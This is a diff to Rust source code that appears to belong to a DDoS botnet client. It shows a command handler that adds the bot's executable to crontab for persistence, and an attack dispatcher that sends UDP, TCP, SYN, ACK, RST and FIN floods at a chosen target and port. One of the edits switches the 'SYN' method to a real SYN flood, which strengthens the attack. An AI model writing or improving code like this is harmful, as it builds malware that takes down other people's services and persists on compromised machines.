@@ -291,7 +291,7 @@ async fn handle_command(command: &str, state: Arc<BotState>) -> Result<()> {
                     }
 
                     if !current_cron.contains(&exe_path.to_string_lossy().to_string()) {
-                        let mut child = Command::new("crontab")
+                        let child = Command::new("crontab")
                             .arg("-")
                             .stdin(Stdio::piped())
                             .spawn();
@@ -397,7 +397,7 @@ async fn handle_v2_attack_command(fields: &[&str], state: Arc<BotState>) -> Resu
         let result: Result<(), Box<dyn std::error::Error + Send + Sync>> = match method_clone.as_str() {
             "UDP" | "STD" => { attack_methods::udp_flood(&target, port, duration, stop_signal_clone).await; Ok(()) },
             "TCP" => { attack_methods::tcp_flood(&target, port, duration, stop_signal_clone).await; Ok(()) },
-            "SYN" => { attack_methods::tcp_connect_flood(&target, port, duration, stop_signal_clone).await; Ok(()) },
+            "SYN" => { attack_methods::syn_flood(&target, port, duration, stop_signal_clone).await; Ok(()) },
             "ACK" => { attack_methods::ack_flood(&target, port, duration, stop_signal_clone).await; Ok(()) },
             "RST" => { attack_methods::rst_flood(&target, port, duration, stop_signal_clone).await; Ok(()) },
             "FIN" => { attack_methods::fin_flood(&target, port, duration, stop_signal_clone).await; Ok(()) },
